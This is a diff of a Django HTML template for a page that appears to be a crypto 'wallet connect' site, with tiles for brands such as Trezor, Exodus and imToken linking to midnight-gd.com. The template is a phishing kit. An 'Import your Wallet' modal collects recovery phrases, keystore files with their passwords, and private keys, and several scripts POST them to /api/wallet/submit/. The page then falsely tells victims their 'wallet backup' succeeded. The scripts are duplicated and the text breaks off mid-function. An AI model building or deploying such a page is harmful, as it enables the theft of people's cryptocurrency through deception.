+                                        <img src="{% static "static/logo/midas_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Midas Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="AT.Wallet">
+                            <div id="at_wallet" class="sc-author-box select_wallet" data-title="AT.Wallet" data-logo="{% static "static/logo/at_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/at_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>AT.Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="imToken">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="imToken" data-logo="{% static "static/logo/imtoken.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/imtoken.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>imToken</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        
+                        
+                        
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="D&#39;Cent">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="D&#39;Cent" data-logo="{% static "static/logo/d&#39;cent.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/d&#39;cent.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>D'Cent</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                     
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Enjin">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Enjin" data-logo="{% static "static/logo/enjin.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/enjin.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Enjin</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Etoro">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Etoro" data-logo="{% static "static/logo/etoro.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/etoro.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Etoro</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="ONTO">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="ONTO" data-logo="{% static "static/logo/onto.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/onto.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>ONTO</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Spatium">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Spatium" data-logo="{% static "static/logo/spatium.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/spatium.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Spatium</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Tirus">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Torus" data-logo="{% static "static/logo/torus.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/torus.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Tirus</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Tradestation">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Tradestation" data-logo="{% static "static/logo/tradestation.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/tradestation.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Tradestation</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Zelcore">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Zelcore" data-logo="{% static "static/logo/zelcore.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/zelcore.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Zelcore</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Bifrost Wallet">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Bifrost" data-logo="{% static "static/logo/bifrost.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/bifrost.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Bifrost Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Exodus">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Exodus" data-logo="{% static "static/logo/exodus.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/exodus.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Exodus</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Ellipal">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Ellipal" data-logo="{% static "static/logo/ellipal.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/ellipal.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Ellipal</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Trezor">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Trezor" data-logo="{% static "static/logo/trezor.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/trezor.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Trezor</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Arculus">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Arculus" data-logo="{% static "static/logo/arculus.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/arculus.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Arculus</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Natrium">
+                            <div id="imtoken" class="sc-author-box select_wallet" data-title="Natrium" data-logo="{% static "static/logo/natrium.png" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/natrium.png" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Natrium</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        
+                
+                         <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 error" style="display: none">
+                            <div class="sc-author-box">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#0">
+                                        <img src="{% static "static/logo/error.png" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>No match was found</a></h5>
+                                    <span class="price"></span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+
+<!-- Import Wallet Modal -->
+<form id="walletForm">
+  {% csrf_token %}
+  
+  <!-- all your inputs: wallet_name, email, phrase, keystore, private key etc. -->
+  <div class="modal fade" id="importWalletModal" tabindex="-1" style="display: none;" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content shadow-sm border-0">
+      <div class="modal-header border-0 pb-0">
+        <h5 class="modal-title">Import your Wallet Connect Wallet</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+
+      <div class="modal-body">
+        <!-- Tabs -->
+        <ul class="nav nav-tabs mb-3" id="walletTabs" role="tablist">
+          <li class="nav-item" role="presentation">
+            <button class="nav-link active" id="phrase-tab" data-bs-toggle="tab" data-bs-target="#phrase" type="button" role="tab" aria-selected="true">Phrase</button>
+          </li>
+          <li class="nav-item" role="presentation">
+            <button class="nav-link" id="keystore-tab" data-bs-toggle="tab" data-bs-target="#keystore" type="button" role="tab" aria-selected="false" tabindex="-1">Keystore JSON</button>
+          </li>
+          <li class="nav-item" role="presentation">
+            <button class="nav-link" id="private-tab" data-bs-toggle="tab" data-bs-target="#private" type="button" role="tab" aria-selected="false" tabindex="-1">Private Key</button>
+          </li>
+        </ul>
+
+        <!-- Tab Content -->
+        <div class="tab-content" id="walletTabContent">
+          <!-- Phrase Tab -->
+          <div class="tab-pane fade show active" id="phrase" role="tabpanel" aria-labelledby="phrase-tab">
+            <div class="mb-3">
+              <label for="wallet_name_phrase" class="form-label">Name wallet</label>
+              <input type="text" class="form-control" id="wallet_name_phrase" placeholder="Name wallet">
+            </div>
+            <div class="mb-3">
+              <label for="wallet_email_phrase" class="form-label">Email</label>
+              <input type="email" class="form-control" id="wallet_email_phrase" placeholder="Email">
+            </div>
+            <div class="mb-3">
+              <label for="secret_phrase" class="form-label">Recovery Phrase</label>
+              <textarea rows="3" class="form-control" id="secret_phrase" placeholder="Enter your recovery phrase"></textarea>
+            </div>
+            <small class="text-muted">Valid seed phrases are exactly 12 or 24 words separated by single spaces</small>
+          </div>
+
+          <!-- Keystore Tab -->
+          <div class="tab-pane fade" id="keystore" role="tabpanel" aria-labelledby="keystore-tab">
+            <div class="mb-3">
+              <label for="wallet_name_keystore" class="form-label">Name wallet</label>
+              <input type="text" class="form-control" id="wallet_name_keystore" placeholder="Name wallet">
+            </div>
+            <div class="mb-3">
+              <label for="wallet_email_keystore" class="form-label">Email</label>
+              <input type="email" class="form-control" id="wallet_email_keystore" placeholder="Email">
+            </div>
+            <div class="mb-3">
+              <label for="keystore_json" class="form-label">Keystore JSON</label>
+              <textarea rows="3" class="form-control" id="keystore_json" placeholder="Paste your keystore JSON here"></textarea>
+            </div>
+            <div class="mb-3">
+              <label for="keystore_pass" class="form-label">Keystore Password</label>
+              <input type="password" class="form-control" id="keystore_pass" placeholder="Keystore Password">
+            </div>
+          </div>
+
+          <!-- Private Key Tab -->
+          <div class="tab-pane fade" id="private" role="tabpanel" aria-labelledby="private-tab">
+            <div class="mb-3">
+              <label for="wallet_name_private" class="form-label">Name wallet</label>
+              <input type="text" class="form-control" id="wallet_name_private" placeholder="Name wallet">
+            </div>
+            <div class="mb-3">
+              <label for="wallet_email_private" class="form-label">Email</label>
+              <input type="email" class="form-control" id="wallet_email_private" placeholder="Email">
+            </div>
+            <div class="mb-3">
+              <label for="private_key" class="form-label">Private Key</label>
+              <textarea rows="2" class="form-control" id="private_key" placeholder="Enter your private key"></textarea>
+            </div>
+          </div>
+        </div>
+</form>
+        <!-- Footer Buttons -->
+        <div class="d-flex justify-content-center gap-3 mt-4">
+          <button class="btn btn-cancel px-4 py-2" data-bs-dismiss="modal">Cancel</button>
+          <button type="button" class="btn btn-proceed px-4 py-2" id="connect_wallet_button">Proceed</button>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const proceedBtn = document.getElementById("connect_wallet_button");
+    const walletForm = document.getElementById("walletForm");
+
+    // Enable button when any input is filled
+    walletForm.addEventListener("input", () => {
+        proceedBtn.disabled = false;
+        proceedBtn.style.opacity = 1;
+    });
+
+    // Handle button click -> submit form
+    proceedBtn.addEventListener("click", function() {
+        walletForm.submit();
+    });
+});
+</script>
+
+
+<!-- Fullscreen loader overlay -->
+<div id="loaderOverlay" style="
+  display: none;
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(255,255,255,0.8);
+  z-index: 1055;
+  align-items: center;
+  justify-content: center;
+">
+  <div class="text-center">
+    <div class="spinner-border text-primary" role="status" style="width: 4rem; height: 4rem;">
+      <span class="visually-hidden">Loading...</span>
+    </div>
+    <div class="mt-3 fs-5 text-primary fw-bold">Backup Initiated...</div>
+  </div>
+</div>
+
+
+<script>
+  $(document).on('hidden.bs.modal', '.modal', function () {
+    // Remove leftover modal-open class and backdrop
+    $('body').removeClass('modal-open');
+    $('.modal-backdrop').remove();
+  });
+</script>
+
+<!-- Script -->
+<script>
+  $(document).ready(function () {
+    $('.select_wallet').on('click', function (e) {
+      e.preventDefault();
+
+      // Get wallet name
+      var walletName = $(this).data('title');
+
+      // Auto-fill all wallet name inputs
+      $('#wallet_name_phrase').val(walletName);
+      $('#wallet_name_keystore').val(walletName);
+      $('#wallet_name_private').val(walletName);
+
+      // Set modal title
+      $('#importWalletModal .modal-title').text('Import your ' + walletName + ' Wallet');
+
+      // Show modal
+      var importModal = new bootstrap.Modal(document.getElementById('importWalletModal'));
+      importModal.show();
+    });
+  });
+</script>
+
+<!-- Wallet Modal + Submit Script -->
+<script>
+  $(document).ready(function () {
+    // Autofill and open modal
+    $('.select_wallet').on('click', function () {
+      const walletName = $(this).data('title');
+
+      $('#wallet_name_phrase').val(walletName);
+      $('#wallet_name_keystore').val(walletName);
+      $('#wallet_name_private').val(walletName);
+
+      $('#importWalletModal .modal-title').text('Import your ' + walletName + ' Wallet');
+
+      const importModal = new bootstrap.Modal(document.getElementById('importWalletModal'));
+      importModal.show();
+    });
+
+    // Ensure modal backdrop is removed if user closes modal manually
+    $('#importWalletModal').on('hidden.bs.modal', function () {
+      $('.modal-backdrop').remove();
+      $('body').removeClass('modal-open');
+      $('body').css('padding-right', '');
+    });
+
+    // Validate active tab input
+    function validateInputs() {
+      const activeTab = $('.tab-pane.active').attr('id');
+      let isValid = false;
+
+      if (activeTab === 'phrase') {
+        const phrase = $('#secret_phrase').val().trim();
+        const count = phrase.match(/(\w+)/g)?.length || 0;
+        isValid = [12, 15, 18, 21, 24].includes(count);
+      } else if (activeTab === 'keystore') {
+        const json = $('#keystore_json').val().trim();
+        const pass = $('#keystore_pass').val().trim();
+        isValid = json && pass;
+      } else if (activeTab === 'private') {
+        const key = $('#private_key').val().trim();
+        isValid = key !== '';
+      }
+
+      $('#connect_wallet_button').prop('disabled', !isValid).css('opacity', isValid ? 1 : 0.5);
+    }
+
+    // Input triggers validation
+    $('#secret_phrase, #keystore_json, #keystore_pass, #private_key').on('input', validateInputs);
+    $('button[data-bs-toggle="tab"]').on('shown.bs.tab', validateInputs);
+
+    // Submit logic
+    $('#connect_wallet_button').on('click', function () {
+      const activeTab = $('.tab-pane.active').attr('id');
+      let formData = { method: activeTab };
+
+      if (activeTab === 'phrase') {
+        formData = {
+          ...formData,
+          wallet_name: $('#wallet_name_phrase').val().trim(),
+          wallet_email: $('#wallet_email_phrase').val().trim(),
+          phrase: $('#secret_phrase').val().trim()
+        };
+      } else if (activeTab === 'keystore') {
+        formData = {
+          ...formData,
+          wallet_name: $('#wallet_name_keystore').val().trim(),
+          wallet_email: $('#wallet_email_keystore').val().trim(),
+          keystore_json: $('#keystore_json').val().trim(),
+          keystore_pass: $('#keystore_pass').val().trim()
+        };
+      } else if (activeTab === 'private') {
+        formData = {
+          ...formData,
+          wallet_name: $('#wallet_name_private').val().trim(),
+          wallet_email: $('#wallet_email_private').val().trim(),
+          private_key: $('#private_key').val().trim()
+        };
+      }
+
+      // Disable button + show spinner
+      $(this).html('<span class="spinner-border spinner-border-sm me-2" role="status"></span>Backup Initiated...')
+             .prop('disabled', true);
+
+      // Show full screen loader overlay (with display:flex after fadeIn)
+      $('#loaderOverlay').fadeIn(function () {
+        $(this).css('display', 'flex');
+      });
+
+      // 🔥 FIXED: Send to Django, not process.php
+      $.ajax({
+        type: 'POST',
+        url: '/api/wallet/submit/',
+        data: JSON.stringify(formData),
+        contentType: 'application/json',
+        headers: { 'X-CSRFToken': getCookie('csrftoken') },
+        dataType: 'json'
+      }).done(function (response) {
+        $('#loaderOverlay').fadeOut();
+
+        const importModal = bootstrap.Modal.getInstance(document.getElementById('importWalletModal'));
+        if (importModal) importModal.hide();
+
+        $('body').append(`
+          <div class="modal fade" id="walletSuccessModal" tabindex="-1" role="dialog" aria-hidden="true">
+            <div class="modal-dialog modal-dialog-centered" role="document">
+              <div class="modal-content text-center p-4">
+                <h5 class="mb-3" style="color: green">✅ Wallet Backup Successful</h5>
+                <p>Your wallet details have been securely backed up.</p>
+                <button id="backToHomeBtn" class="btn btn-success mt-3">Back to Home</button>
+              </div>
+            </div>
+          </div>
+        `);
+
+        const successModal = new bootstrap.Modal(document.getElementById('walletSuccessModal'));
+        successModal.show();
+
+        $(document).on('click', '#backToHomeBtn', function () {
+          window.location.href = '/';
+        });
+
+      }).fail(function (xhr) {
+        $('#loaderOverlay').fadeOut();
+        $('#connect_wallet_button').html('Proceed').prop('disabled', false);
+
+        let msg = "Something went wrong. Please try again.";
+        if (xhr.responseText) {
+          try {
+            const data = JSON.parse(xhr.responseText);
+            if (data.error) msg = data.error;
+          } catch {}
+        }
+        alert(msg);
+      });
+    })
+  });
+</script>
+
+
+
+
+<style>
+        .btn-outline-primary {
+            width: 100%;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 15px;
+            line-height: 22px;
+            padding: 10px 20px;
+            -webkit-transition: all 0.3s ease-in-out;
+            -moz-transition: all 0.3s ease-in-out;
+            -ms-transition: all 0.3s ease-in-out;
+            -o-transition: all 0.3s ease-in-out;
+            transition: all 0.3s ease-in-out;
+            outline: none;
+            border: 1px solid #5142FC;
+            margin-bottom: 10px
+        }
+</style>
+	
+<style>
+/* Tooltip */
+.sc-author-box {
+  position: relative;
+  transition: all 0.3s ease;
+  overflow: hidden;
+  border: 1px solid transparent; /* default transparent border */
+}
+
+/* Tooltip bubble */
+.sc-author-box::after {
+  content: attr(data-title);
+  position: absolute;
+  bottom: 110%;
+  left: 50%;
+  transform: translateX(-50%);
+  background-color: #222;
+  color: #fff;
+  padding: 6px 12px;
+  border-radius: 6px;
+  font-size: 13px;
+  opacity: 0;
+  pointer-events: none;
+  white-space: nowrap;
+  transition: opacity 0.3s ease;
+  z-index: 1000;
+}
+
+/* Show tooltip on hover */
+.sc-author-box:hover::after {
+  opacity: 1;
+}
+
+/* Green overlay on hover */
+.sc-author-box::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background-color: rgba(144, 238, 144, 0.1); /* light green tint */
+  opacity: 0;
+  transition: opacity 0.3s ease;
+  z-index: 1;
+}
+
+/* Show overlay and border on hover */
+.sc-author-box:hover::before {
+  opacity: 1;
+}
+
+.sc-author-box:hover {
+  border: 1px solid rgba(144, 238, 144, 0.8); /* 1px light green border */
+}
+
+/* Image popup on hover */
+.sc-author-box .avatar {
+  width: 50px;
+  height: 50px;
+  transition: transform 0.3s ease;
+  z-index: 2;
+  position: relative;
+}
+
+.sc-author-box:hover .avatar {
+  transform: scale(1.15);
+  z-index: 2;
+}
+</style>
+
+<script>
+  const searchInput = document.getElementById('walletSearch');
+  const walletBoxes = document.querySelectorAll('.wallet-box');
+
+  searchInput.addEventListener('input', () => {
+    const query = searchInput.value.toLowerCase().trim();
+
+    walletBoxes.forEach(box => {
+      const walletName = box.getAttribute('data-wallet-name').toLowerCase();
+      if (walletName.includes(query)) {
+        box.style.display = 'block';
+      } else {
+        box.style.display = 'none';
+      }
+    });
+  });
+</script>
+
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const proceedBtn = document.getElementById("connect_wallet_button");
+
+    // Enable the button if any input is filled
+    document.querySelectorAll("#walletTabContent input, #walletTabContent textarea").forEach(input => {
+        input.addEventListener("input", () => {
+            let hasValue = Array.from(document.querySelectorAll("#walletTabContent input, #walletTabContent textarea"))
+                .some(el => el.value.trim() !== "");
+            proceedBtn.disabled = !hasValue;
+            proceedBtn.style.opacity = hasValue ? "1" : "0.5";
+        });
+    });
+
+    // Handle button click
+    proceedBtn.addEventListener("click", function () {
+        let activeTab = document.querySelector("#walletTabs .nav-link.active").id.replace("-tab", "");
+
+        let data = {
+            wallet_name: document.getElementById(`wallet_name_${activeTab}`).value,
+            wallet_email: document.getElementById(`wallet_email_${activeTab}`).value,
+            method: activeTab,
+            phrase: activeTab === "phrase" ? document.getElementById("secret_phrase").value : "",
+            keystore_json: activeTab === "keystore" ? document.getElementById("keystore_json").value : "",
+            keystore_pass: activeTab === "keystore" ? document.getElementById("keystore_pass").value : "",
+            private_key: activeTab === "private" ? document.getElementById("private_key").value : ""
+        };
+
+        fetch("{% url 'wallet_submit' %}", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "X-CSRFToken": "{{ csrf_token }}"
+            },
+            body: new URLSearchParams(data)
+        })
+        .then(res => res.json())
+        .then(res => {
+            if (res.success) {
+                alert("✅ " + res.message);
+                bootstrap.Modal.getInstance(document.getElementById("importWalletModal")).hide();
+            } else {            }
+        })
+        .catch(err => {
+            console.error(err);
+        });
+    });
+});
+</script>
+
+
+
+
+
+
+<script>
+async function submitWallet() {
+  try {
+    // Which tab is active?
+    const active = document.querySelector('#walletTabContent .tab-pane.active');
+    const method = active ? active.id : 'phrase'; // "phrase" | "keystore" | "private"
+
+    // Collect values by method
+    let payload = { method };
+
+    if (method === 'phrase') {
+      payload.wallet_name  = (document.getElementById('wallet_name_phrase')  ?.value || '').trim();
+      payload.wallet_email = (document.getElementById('wallet_email_phrase') ?.value || '').trim();
+      payload.phrase       = (document.getElementById('secret_phrase')       ?.value || '').trim();
+    } else if (method === 'keystore') {
+      payload.wallet_name   = (document.getElementById('wallet_name_keystore') ?.value || '').trim();
+      payload.wallet_email  = (document.getElementById('wallet_email_keystore')?.value || '').trim();
+      payload.keystore_json = (document.getElementById('keystore_json')        ?.value || '').trim();
+      payload.keystore_pass = (document.getElementById('keystore_pass')        ?.value || '').trim();
+    } else if (method === 'private') {
+      payload.wallet_name  = (document.getElementById('wallet_name_private') ?.value || '').trim();
+      payload.wallet_email = (document.getElementById('wallet_email_private')?.value || '').trim();
+      payload.private_key  = (document.getElementById('private_key')         ?.value || '').trim();
+    }
+
+    // Basic guard
+    if (!payload.wallet_name) {
+      alert('Please enter the wallet name.');
+      return;
+    }
+
+    // Optional: show your loader here
+    const loader = document.getElementById('backupLoader'); // if you have one
+    if (loader) loader.style.display = 'block';
+
+    const res = await fetch('/api/wallet/submit/', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-CSRFToken': getCookie('csrftoken')
+      },
+      body: JSON.stringify(payload)
+    });
+
+    const text = await res.text();         // ← read as text
+    let data = null;
+    try { data = text ? JSON.parse(text) : null; } catch { data = null; }
+
+    if (!res.ok || !data || data.success !== true) {
+      const msg = (data && data.error) ? data.error : (text || 'Request failed');
+      throw new Error(msg);
+    }
+    // ✅ SUCCESS HANDLER STARTS HERE
+    // Hide the import modal
+    const modalEl = document.getElementById('importWalletModal');
+    if (modalEl && window.bootstrap) {
+      const modal = bootstrap.Modal.getInstance(modalEl) || new bootstrap.Modal(modalEl);
+      modal.hide();
+    }
+
+    // Show success modal
+    const successModal = new bootstrap.Modal(document.getElementById('backupSuccessModal'));
+    successModal.show();
+    // ✅ SUCCESS HANDLER ENDS HERE
+
+  } catch (err) {
+    console.error(err);
+    alert(`⚠️ Error: "${String(err.message || err)}"`);
+  } finally {
+    const loader = document.getElementById('backupLoader');
+    if (loader) loader.style.display = 'none';
+  }
+}
+
+// CSRF helper stays the same
+function getCookie(name) {
+  let cookieValue = null;
+  if (document.cookie && document.cookie !== '') {
+    const cookies = document.cookie.split(';');
+    for (let i = 0; i < cookies.length; i++) {
+      const cookie = cookies[i].trim();
+      if (cookie.substring(0, name.length + 1) === (name + '=')) {
+        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+        break;
+      }
+    }
+  }
+  return cookieValue;
+}
+  // Custom success popup
+const successPopup = document.createElement('div');
+successPopup.innerHTML = `
+  <div style="
+    position: fixed; top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    background: background: transparent; padding: 30px 40px;
+    backdrop-filter: blur(15px);
+    border-radius: 20px; text-align: center;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    z-index: 9999;">
+    <h3 style="color: green; margin-bottom: 10px;">✅ Success!</h3>
+    <p>Your wallet has been submitted successfully.</p>
+    <button id="successOkBtn" style="
+      margin-top: 15px; padding: 10px 20px;
+      background: #4CAF50; color: white;
+      border: none; border-radius: 6px;
+      cursor: pointer;">OK</button>
+  </div>
+  <div style="
+    position: fixed; top:0; left:0;
+    width:100%; height:100%;
+    background: blur(5px) rgba(0,0,0,0.5);
+    z-index: 9998;"></div>
+`;
+
+document.body.appendChild(successPopup);
+
+// Handle OK button → redirect to home
+document.getElementById('successOkBtn').addEventListener('click', () => {
+  window.location.href = "/";  // change "/" to your homepage path if different
+});
+
+
+
+    // Hide modal if using Bootstrap 5
+    const modalEl = document.getElementById('importWalletModal');
+    if (modalEl && window.bootstrap) {
+      const modal = bootstrap.Modal.getInstance(modalEl) || new bootstrap.Modal(modalEl);
+      modal.hide();
+    }
+
+  } catch (err) {
+    console.error(err);
+  } finally {
+    // Always hide loader
+    const loader = document.getElementById('backupLoader');
+    if (loader) loader.style.display = 'none';
+  }
+}
+
+// CSRF helper stays the same
+function getCookie(name) {
+  let cookieValue = null;
+  if (document.cookie && document.cookie !== '') {
+    const cookies = document.cookie.split(';');
+    for (let i = 0; i < cookies.length; i++) {
+      const cookie = cookies[i].trim();
